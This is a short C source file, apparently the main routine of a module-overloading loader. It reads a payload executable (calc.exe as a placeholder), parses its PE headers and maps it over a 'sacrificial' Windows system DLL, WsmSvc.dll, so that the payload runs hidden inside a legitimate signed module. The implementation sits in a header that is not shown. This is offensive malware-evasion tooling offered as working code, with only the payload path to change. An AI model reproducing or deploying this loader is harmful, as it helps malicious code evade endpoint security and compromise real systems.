#include "box.h"

#define SACRIFICAL_DLL	"C:\\Windows\\System32\\WsmSvc.dll"
#define PAYLOAD_PE		"C:\\Windows\\System32\\calc.exe"

int main()
{

	LPVOID FileBuffer = NULL;
	DWORD NumberOfBytesToRead = 0;
	PEHEADERS PeHeader = { 0 };

	if (!ReadTargetFile(PAYLOAD_PE, &FileBuffer, &NumberOfBytesToRead))
	{
		PRINT_ERROR("ReadTargetFile");
		return 1;
	}

	if (!GrabPeHeader(FileBuffer, &PeHeader))
	{
		PRINT_ERROR("GrabPeHeader");
		return 1;
	}

	if (!ModuleOverload(PAYLOAD_PE, SACRIFICAL_DLL, FileBuffer, PeHeader))
	{
		PRINT_ERROR("ModuleOverload");
		return 1;
	}

	OKAY("DONE!");

	CHAR("Quit...");
	getchar();

	return 0;

}